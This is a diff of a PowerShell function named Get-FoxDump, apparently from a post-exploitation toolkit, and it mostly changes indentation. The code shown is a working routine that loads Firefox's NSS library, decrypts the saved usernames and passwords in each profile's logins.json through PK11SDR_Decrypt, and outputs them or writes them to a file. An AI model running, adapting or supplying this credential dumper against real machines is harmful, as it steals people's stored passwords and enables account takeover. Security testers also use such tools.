@@ -780,7 +780,7 @@ Function Get-FoxDump
     }
     elseif([IntPtr]::Size -eq 4)
     {        
-    $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
+        $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
     }
 
     If(Test-Path $mozillapath)
@@ -865,7 +865,7 @@ Function Get-FoxDump
     $NSSShutdownAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Shutdown")
     $NSSShutdownDelegates = Get-DelegateType @() ([int])
     $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSShutdownAddr, $NSSShutdownDelegates)
-
+    
     $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
@@ -934,17 +934,17 @@ Function Get-FoxDump
             
                 Write-Verbose "[+]Checking passwords for profile $profilePath"
                 $NSSInitResult = $NSS_Init.Invoke($profilePath)
-    Write-Verbose "[+]NSS_Init result: $NSSInitResult"
-        #Web.extensions assembly is necessary for handling json files
-        try
-        {
-           Add-Type -AssemblyName System.web.extensions
-        }
-        catch
-        {
-            Write-Warning "Unable to load System.web.extensions assembly"
-            break
-        }
+                Write-Verbose "[+]NSS_Init result: $NSSInitResult"
+                 #Web.extensions assembly is necessary for handling json files
+                try
+                {
+                   Add-Type -AssemblyName System.web.extensions
+                }
+                catch
+                {
+                    Write-Warning "Unable to load System.web.extensions assembly"
+                    break
+                }
 
                 $loginsJsonPath = Join-Path $profilePath "logins.json"
                 if (-Not (Test-Path $loginsJsonPath))
@@ -953,50 +953,50 @@ Function Get-FoxDump
                     continue
                 }
                 $jsonFile = Get-Content $loginsJsonPath
-        if(!($jsonFile))
-        {
-            Write-Warning "Login information cannot be found in logins.json"
+                if(!($jsonFile))
+                {
+                    Write-Warning "Login information cannot be found in logins.json"
                     continue
-        }
-        $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
-        $obj = $ser.DeserializeObject($jsonFile)
+                }
+                $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer
+                $obj = $ser.DeserializeObject($jsonFile)
 
 
-        $logins = $obj['logins']
-        $count = ($logins.Count) - 1
-        $passwordlist = @()
-        #Iterate through each login entry and decrypt the username and password fields
-        for($i = 0; $i -le $count; $i++)
-        {
-            Write-Verbose "[+]Decrypting login information..."
-            $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
-            $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
+                $logins = $obj['logins']
+                $count = ($logins.Count) - 1
+                $passwordlist = @()
+                #Iterate through each login entry and decrypt the username and password fields
+                for($i = 0; $i -le $count; $i++)
+                {
+                    Write-Verbose "[+]Decrypting login information..."
+                    $user = Decrypt-CipherText $($logins.GetValue($i)['encryptedUsername'])
+                    $pass = Decrypt-CipherText $($logins.GetValue($i)['encryptedPassword'])
                     $hostname = $($logins.GetValue($i)['hostname'])
                     $httpRealm = $($logins.GetValue($i)['httpRealm'])
-            $formUrl = $($logins.GetValue($i)['formSubmitURL'])
-            $FoxCreds = New-Object PSObject -Property @{
-                UserName = $user
-                Password = $pass
+                    $formUrl = $($logins.GetValue($i)['formSubmitURL'])
+                    $FoxCreds = New-Object PSObject -Property @{
+                        UserName = $user
+                        Password = $pass
                         Hostname = $hostname
                         HttpRealm = $httpRealm
-                URL = $formUrl
-            }
-            $passwordlist += $FoxCreds
-        }
-        #Spit out the results to a file.... or not.
-        if($OutFile)
-        {
+                        URL = $formUrl
+                    }
+                    $passwordlist += $FoxCreds
+                }
+                #Spit out the results to a file.... or not.
+                if($OutFile)
+                {
                     if($passwordlist.Length -gt 0)
                     {
                         $passwordlist | Format-List Hostname, HttpRealm, URL, UserName, Password | Out-File -Encoding ascii $OutFile -Append
-        }
-        else
-        {
+                    }
+                    else
+                    {
                         "No credentials found" | Out-File -Encoding ascii $OutFile -Append
                     }                              
-    }
-    else
-    {
+                }
+                else
+                {
                     if($passwordlist.Length -gt 0)
                     {
                         $passwordlist | Format-List Hostname, HttpRealm, URL, UserName, Password | Out-String
@@ -1016,11 +1016,11 @@ Function Get-FoxDump
         else
         {
             Write-Warning "Unable to locate profile $profilePath"
-    }
+        }
     }
 
     $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
     $kernel32::FreeLibrary($nssdllhandle) | Out-Null
-
+   
 }
 
